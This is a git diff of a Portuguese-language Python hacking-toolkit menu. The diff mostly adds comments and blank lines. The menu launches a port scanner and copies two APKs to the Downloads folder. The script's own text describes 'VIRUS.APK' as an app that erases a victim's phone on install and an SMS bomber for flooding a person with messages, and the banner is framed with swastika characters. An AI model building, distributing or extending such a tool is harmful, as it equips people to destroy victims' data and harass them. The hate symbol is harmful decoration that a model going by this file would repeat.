@@ -140,7 +140,7 @@ l\033[0m\033[1;31m 卐                                           卐 \033[0m\033
 
      match MENU_BW:  
           case "1":
-               iniciar_kelzerscan()
+               iniciar_kelzerscan() #chama os shells pra iniciar minha script de PortScan
           case "2":
                print ('''
  \033[1;33m Centro-Oeste:\033[0m\033[1;34m
@@ -192,8 +192,24 @@ l\033[0m\033[1;31m 卐                                           卐 \033[0m\033
 O APK VIRUS.APK é um app que quando a vítima instala o mesmo vai apagar tudo do celular dela, e o app sms bomber seve pra enviar vários sms pra pessoa.
                     \033[0m  ''')
                OP_PAUSAR = input('\033[33mAPERTE ENTER PARA OBTER OS APKS:\033[0m')
-               copiar_app_virusapk()
-               copiar_app_smsbomber()
+
+
+
+
+
+
+               
+               copiar_app_virusapk() #cuidado com esse apk, ele serve pra formatar o cell
+               copiar_app_smsbomber() #Cuidado com esse tbm, eu baixei na internet, não sei se tem vírus
+
+
+
+
+
+
+
+
+               
                clear()
                print ('''\033[31mPRONTO, AGORA VERIFIQUE A SUA PASTA DE DOWNLOADS.\033[0m:
                       ''')
@@ -246,6 +262,6 @@ GRUPO DO TELEGRAM:\033[0m\033[1;34m
 \033[03;32m"Às vezes criatividade é continuar criando coisas mesmo não sendo reconhecido", Gabriel Kelzer.\033[0m
 ''')
           case _:
-               print ('''\033[31mO número que você digitou é inválido !!!\033[0m
-                      ''')
+               print ('''\033[31mO número que você digitou é inválido !!!\033[0m 
+                      ''') #Essa opção é somente se as anteriores não foram atendidas
                OP_PAUSAR = input('\033[33mAPERTE ENTER PARA VOLTAR AO MENU ANTERIOR:\033[0m')
